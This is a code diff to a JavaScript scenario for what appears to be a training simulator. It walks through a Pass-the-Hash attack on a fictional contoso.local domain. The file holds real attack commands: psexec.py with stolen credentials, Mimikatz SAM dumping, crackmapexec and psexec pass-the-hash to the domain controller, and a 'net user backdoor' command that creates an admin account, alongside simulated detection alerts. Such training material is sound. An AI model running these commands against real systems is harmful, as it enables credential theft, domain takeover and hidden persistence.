@@ -3,11 +3,15 @@
  *
  * This scenario simulates the Pass-the-Hash attack, where an attacker uses
  * stolen NTLM hashes to authenticate without knowing the plaintext password.
+ *
+ * THIS SCENARIO ASSUMES:
+ * 1. `sqlservice:P@ssw0rd123!` credentials were stolen from Kerberoasting.
+ * 2. `BH.zip` analysis from BloodHound revealed `sqlservice` is admin on `SQL01` (10.0.1.20).
  */
 
 export const pthScenario = {
   id: 'pass-the-hash',
-  title: 'Pass-the-Hash: Lateral Movement Without Passwords',
+  title: 'Pass-the-Hash: Lateral Movement',
   description: 'Learn how attackers use stolen NTLM hashes to move laterally through the network.',
 
   network: {
@@ -17,6 +21,8 @@ export const pthScenario = {
       role: 'Red Team Machine'
     },
     target: {
+      // NOTE: The 'target' for this scenario is the DC (10.0.1.10),
+      // but the *first hop* is SQL01 (10.0.1.20).
       ip: '10.0.1.10',
       hostname: 'DC01.contoso.local',
       role: 'Domain Controller'
@@ -25,52 +31,60 @@ export const pthScenario = {
   },
 
   guide: {
-    overview: `**Pass-the-Hash (PtH)** is a lateral movement technique that uses stolen NTLM password hashes to authenticate to other systems without knowing the plaintext password.
+    overview: `**Pass-the-Hash (PtH)** is a lateral movement technique that uses stolen NTLM password hashes to authenticate to other systems.
 
 **Attack Flow:**
-1. Extract NTLM hashes from a compromised system (via Mimikatz, etc.)
-2. Use the hashes to authenticate to other systems
-3. Access resources as the compromised user
-4. Perform lateral movement and privilege escalation
+1. Use compromised 'sqlservice' credentials to gain a shell on the 'SQL01' server.
+2. Dump NTLM hashes from 'SQL01' memory using Mimikatz.
+3. Identify the 'Administrator' hash.
+4. Use the 'Administrator' hash to "Pass-the-Hash" to the Domain Controller.
+5. Establish persistence on the new system.
 
 **Why This Matters:**
-Pass-the-Hash is extremely dangerous because it bypasses password requirements. Attackers can move laterally across the network using stolen hashes, making it a critical post-exploitation technique.`,
+PtH bypasses password requirements. By compromising one machine, attackers can dump hashes from memory and use them to hop to other machines, escalating privileges as they go.`,
 
     steps: [
       {
         number: 1,
+        title: 'Gain Initial Shell',
+        description: 'Use the "sqlservice" credentials (from Kerberoasting) to gain an administrative shell on the "SQL01" server (10.0.1.20) using psexec.py.',
+        command: 'psexec.py contoso.local/sqlservice:P@ssw0rd123!@10.0.1.20',
+        tip: 'Our BloodHound recon showed "sqlservice" is an admin on this server.'
+      },
+      {
+        number: 2,
         title: 'Extract NTLM Hashes',
-        description: 'Dump NTLM password hashes from the compromised system using Mimikatz or similar tools.',
+        description: 'Now that you are on the "SQL01" server, dump NTLM password hashes from memory using Mimikatz.',
         command: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"',
         tip: 'NTLM hashes are stored in the SAM database on Windows systems'
       },
       {
-        number: 2,
-        title: 'Identify Target Systems',
-        description: 'Scan the network to identify systems where the compromised user has access.',
-        command: 'crackmapexec smb 10.0.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 --shares',
-        tip: 'The hash format is LM:NTLM, where LM is often disabled (aad3b435b51404eeaad3b435b51404ee)'
-      },
-      {
         number: 3,
-        title: 'Access Target System',
-        description: 'Use the NTLM hash to authenticate to a target system without knowing the password.',
-        command: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.20',
-        tip: 'The hash allows authentication just like a password would'
+        title: 'Identify Target Systems',
+        description: 'You found the local Administrator hash. Use crackmapexec to see where else this hash works.',
+        command: 'crackmapexec smb 10.0.1.0/24 -u admin -H 5f4dcc3b5aa765d61d8327deb882cf99',
+        tip: 'The hash format is LM:NTLM, but the LM hash is often a blank placeholder.'
       },
       {
         number: 4,
+        title: 'Move to Domain Controller',
+        description: 'The hash works on the DC (10.0.1.10)! Use psexec.py *with the hash* to authenticate and get a shell.',
+        command: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.10',
+        tip: 'The -hashes flag tells psexec.py to use the NTLM hash instead of a password.'
+      },
+      {
+        number: 5,
         title: 'Establish Persistence',
-        description: 'Create a backdoor or persistence mechanism on the target system.',
+        description: 'You are now on the Domain Controller. Create a backdoor or persistence mechanism.',
         command: 'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
         tip: 'Persistence ensures continued access even if the original account is disabled'
       },
       {
-        number: 5,
+        number: 6,
         title: 'Escalate Privileges',
-        description: 'Use the compromised system to escalate privileges and move toward Domain Admin.',
+        description: 'You have compromised a Domain Controller and established persistence.',
         command: null,
-        tip: 'Repeat PtH attacks to compromise additional high-privilege accounts'
+        tip: 'From here, you could perform a DCSync attack.'
       }
     ]
   },
@@ -78,9 +92,38 @@ Pass-the-Hash is extremely dangerous because it bypasses password requirements. 
   steps: [
     {
       id: 1,
+      expectedCommand: 'psexec.py contoso.local/sqlservice:P@ssw0rd123!@10.0.1.20',
+      attackerOutput: [
+        '[*] Connecting to 10.0.1.20 (SQL01)...',
+        '[*] Authenticating as contoso.local\\sqlservice...',
+        '[+] Authentication successful',
+        '[+] Connected to SQL01 as sqlservice',
+        '[*] Creating service for remote execution...',
+        '[+] Service created: PSEXESVC',
+        '[+] Executing command shell...',
+        '[+] Command shell established',
+        'C:\\Windows\\System32> whoami',
+        'contoso\\sqlservice',
+        'C:\\Windows\\System32> hostname',
+        'SQL01',
+        '[+] Remote execution successful. You are on the SQL01 server.'
+      ],
+      serverOutput: [
+        '[SMB] Connection from 10.0.0.5',
+        '[SMB] User: sqlservice',
+        '[SMB] Authentication: NTLM (Password)',
+        '[SMB] Access: ADMIN$',
+        '[SYSTEM] Service creation detected: PSEXESVC',
+        '[SYSTEM] Remote command execution initiated',
+        '[ALERT] Lateral movement detected - sqlservice account on SQL01'
+      ],
+      delay: 400
+    },
+    {
+      id: 2,
       expectedCommand: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"',
       attackerOutput: [
-        '[*] Starting Mimikatz...',
+        '[*] Starting Mimikatz on SQL01...',
         '[*] Requesting debug privilege...',
         '[+] Debug privilege obtained',
         '[*] Elevating token...',
@@ -93,36 +136,36 @@ Pass-the-Hash is extremely dangerous because it bypasses password requirements. 
         '[+] Total hashes extracted: 3'
       ],
       serverOutput: [
-        '[SYSTEM] Process: mimikatz.exe started',
+        '[SYSTEM] Process: mimikatz.exe started on SQL01',
         '[SECURITY] Debug privilege requested',
         '[SECURITY] Token elevation detected',
         '[SECURITY] SAM database access detected',
-        '[ALERT] Credential dumping activity detected on local system'
+        '[ALERT] Credential dumping activity detected on SQL01'
       ],
       delay: 500
     },
     {
-      id: 2,
-      expectedCommand: 'crackmapexec smb 10.0.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 --shares',
+      id: 3,
+      expectedCommand: 'crackmapexec smb 10.0.1.0/24 -u admin -H 5f4dcc3b5aa765d61d8327deb882cf99',
       attackerOutput: [
         '[*] Starting CrackMapExec SMB scan...',
         '[*] Scanning subnet: 10.0.1.0/24',
         '[*] Using hash authentication (Pass-the-Hash)',
         '[*] Scanning 10.0.1.10 (DC01)...',
         '[+] 10.0.1.10 - SMB signing: True',
-        '[+] 10.0.1.10 - Shares: ADMIN$, C$, NETLOGON, SYSVOL, Users',
+        '[+] (Pwned!) VALID: admin:5f4dcc3b5aa765d61d8327deb882cf99',
         '[*] Scanning 10.0.1.20 (SQL01)...',
         '[+] 10.0.1.20 - SMB signing: False',
-        '[+] 10.0.1.20 - Shares: ADMIN$, C$, Backups, Data',
+        '[+] (Pwned!) VALID: admin:5f4dcc3b5aa765d61d8327deb882cf99',
         '[*] Scanning 10.0.1.30 (FILE01)...',
-        '[+] 10.0.1.30 - SMB signing: False',
-        '[+] 10.0.1.30 - Shares: ADMIN$, C$, Shared, Archive',
-        '[+] Scan complete - 3 systems accessible with admin hash'
+        '[-] 10.0.1.30 - SMB signing: False',
+        '[-] INVALID: admin:5f4dcc3b5aa765d61d8327deb882cf99',
+        '[+] Scan complete - 2 systems accessible with admin hash'
       ],
       serverOutput: [
         '[SMB] Connection from 10.0.0.5 (NTLM auth)',
-        '[SMB] User: admin',
-        '[SMB] Authentication successful',
+        '[SMB] User: admin (using hash)',
+        '[SMB] Authentication successful on DC01',
         '[SMB] Share access: ADMIN$',
         '[AUDIT] Multiple SMB connections from 10.0.0.5 with admin account',
         '[ALERT] Potential lateral movement activity detected'
@@ -130,14 +173,14 @@ Pass-the-Hash is extremely dangerous because it bypasses password requirements. 
       delay: 600
     },
     {
-      id: 3,
-      expectedCommand: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.20',
+      id: 4,
+      expectedCommand: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.10',
       attackerOutput: [
-        '[*] Connecting to 10.0.1.20 (SQL01)...',
+        '[*] Connecting to 10.0.1.10 (DC01)...',
         '[*] Using Pass-the-Hash authentication',
-        '[*] Hash: aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99',
+        '[*] Hash: 5f4dcc3b5aa765d61d8327deb882cf99',
         '[+] Authentication successful',
-        '[+] Connected to SQL01 as admin',
+        '[+] Connected to DC01 as admin',
         '[*] Creating service for remote execution...',
         '[+] Service created: PSEXESVC',
         '[+] Executing command shell...',
@@ -145,8 +188,8 @@ Pass-the-Hash is extremely dangerous because it bypasses password requirements. 
         'C:\\Windows\\System32> whoami',
         'CONTOSO\\admin',
         'C:\\Windows\\System32> hostname',
-        'SQL01',
-        '[+] Remote execution successful'
+        'DC01',
+        '[+] Remote execution successful. You are on the Domain Controller!'
       ],
       serverOutput: [
         '[SMB] Connection from 10.0.0.5',
@@ -155,20 +198,20 @@ Pass-the-Hash is extremely dangerous because it bypasses password requirements. 
         '[SMB] Access: ADMIN$',
         '[SYSTEM] Service creation detected: PSEXESVC',
         '[SYSTEM] Remote command execution initiated',
-        '[ALERT] Lateral movement detected - admin account on SQL01'
+        '[ALERT] CRITICAL: Lateral movement to Domain Controller detected!'
       ],
       delay: 500
     },
     {
-      id: 4,
+      id: 5,
       expectedCommand: 'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
       attackerOutput: [
-        '[*] Creating backdoor user account...',
+        '[*] Creating backdoor user account on DC01...',
         '[+] User created: backdoor',
         '[+] Password set: P@ssw0rd123',
         '[*] Adding backdoor to administrators group...',
         '[+] backdoor added to administrators',
-        '[+] Persistence established on SQL01',
+        '[+] Persistence established on DC01',
         '[*] Backdoor account details:',
         '[+]   Username: backdoor',
         '[+]   Password: P@ssw0rd123',
@@ -178,31 +221,29 @@ Pass-the-Hash is extremely dangerous because it bypasses password requirements. 
       serverOutput: [
         '[SYSTEM] User account created: backdoor',
         '[SYSTEM] Group membership changed: backdoor -> Administrators',
-        '[AUDIT] New administrator account created',
-        '[ALERT] Persistence mechanism detected',
-        '[ALERT] Recommend investigation of new user accounts'
+        '[AUDIT] New administrator account created on DC01',
+        '[ALERT] CRITICAL: Persistence mechanism detected on Domain Controller'
       ],
       delay: 500
     },
     {
-      id: 5,
+      id: 6,
       expectedCommand: null,
       attackerOutput: [
         '',
         '[+] ============================================',
         '[+] Pass-the-Hash Attack Summary',
         '[+] ============================================',
-        '[+] Hashes Extracted: 3',
+        '[+] Hashes Extracted: 3 (from SQL01)',
         '[+] Systems Scanned: 3',
-        '[+] Systems Compromised: 1 (SQL01)',
+        '[+] Systems Compromised: 2 (SQL01, DC01)',
         '[+] Backdoor Accounts Created: 1',
-        '[+] Persistence: Established',
+        '[+] Persistence: Established on DC01',
         '[+] ============================================',
         '[*] Next Steps:',
-        '[*] 1. Use backdoor account for persistent access',
-        '[*] 2. Repeat PtH attacks on other systems',
-        '[*] 3. Target Domain Controller for Domain Admin',
-        '[*] 4. Establish domain-wide persistence',
+        '[*] 1. Use Domain Controller access to run DCSync',
+        '[*] 2. Target KRBTGT account for Golden Tickets',
+        '[*] 3. Establish domain-wide persistence',
         '',
         '[+] Lateral movement successful! 🎯'
       ],
@@ -210,14 +251,13 @@ Pass-the-Hash is extremely dangerous because it bypasses password requirements. 
         '',
         '[ALERT] SECURITY INCIDENT DETECTED',
         '[ALERT] Lateral movement attack in progress',
-        '[ALERT] Multiple systems compromised:',
-        '[ALERT]   - SQL01: admin account (PtH)',
-        '[ALERT]   - SQL01: backdoor account (persistence)',
+        '[ALERT] Domain Controller compromised:',
+        '[ALERT]   - DC01: admin account (PtH)',
+        '[ALERT]   - DC01: backdoor account (persistence)',
         '[ALERT] Recommend immediate incident response:',
         '[ALERT]   1. Reset all user passwords',
         '[ALERT]   2. Disable compromised accounts',
-        '[ALERT]   3. Review SMB logs for lateral movement',
-        '[ALERT]   4. Scan for additional backdoors'
+        '[ALERT]   3. Scan for additional backdoors'
       ],
       delay: 400
     }
